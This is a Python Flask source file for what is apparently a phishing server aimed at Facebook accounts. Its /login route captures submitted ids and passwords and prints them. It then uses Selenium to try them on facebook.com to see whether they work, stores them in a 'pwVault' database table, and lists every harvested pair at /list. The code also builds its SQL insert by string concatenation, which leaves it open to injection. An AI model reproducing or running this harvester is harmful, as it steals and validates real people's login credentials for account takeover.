from flask import Flask, render_template, request, send_from_directory
import http.server
import socketserver
from selenium import webdriver 
from time import sleep
import sqlite3 as sql
app = Flask(__name__)

#Handler = http.server.SimpleHTTPRequestHandler
#httpd = http.server.HTTPServer(("", 8081), Handler)

@app.route('/ashley/<path:path>')
def send_js(path):
   return send_from_directory('ashley', path)

@app.route('/')
def home():
   return render_template('home.html')

@app.route('/login',methods = ['POST'])
def addrec():
    try:
        id = request.form['id']
        pw = request.form['pw']
        print("id: " + id + " pw: " + pw)
        test = check_fb_creds(id,pw)
        with sql.connect("database.db") as con:
            cur = con.cursor()      
            query = "INSERT INTO pwVault (id ,pw , test) values ('" + id +  "','" + pw + "','" + test + "')"
            cur.execute(query)
            con.commit()
            msg = "Record successfully added"   
    except Exception as exp:
        con.rollback()
        msg = "error in insert operation" + str(exp)
    finally:
         return render_template("forward.html")
         con.close()

@app.route('/list')
def list():
   con = sql.connect("database.db")
   con.row_factory = sql.Row
   
   cur = con.cursor()
   cur.execute("select * from pwVault")
   
   rows = cur.fetchall();
   return render_template("list.html",rows = rows)

def check_fb_creds(usr,pwd):
    options = webdriver.ChromeOptions()
    options.binary_location = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    chrome_driver_binary = "/usr/local/bin/chromedriver"
    driver = webdriver.Chrome(chrome_driver_binary, chrome_options=options)

    driver.get('https://www.facebook.com/') 
    print ("Opened facebook") 

    username_box = driver.find_element_by_id('email') 
    username_box.send_keys(usr) 
    print ("Email Id entered") 

    password_box = driver.find_element_by_id('pass') 
    password_box.send_keys(pwd) 
    print ("Password entered") 

    login_box = driver.find_element_by_id('loginbutton') 
    login_box.click() 
    
    try:
        username_box = driver.find_element_by_id('email')
        work = 'NO'
    except:
        work = 'YES'
    
    print ("Done")
    driver.quit() 

    return work

if __name__ == '__main__':
   app.run(debug = True)

#httpd.serve_forever()
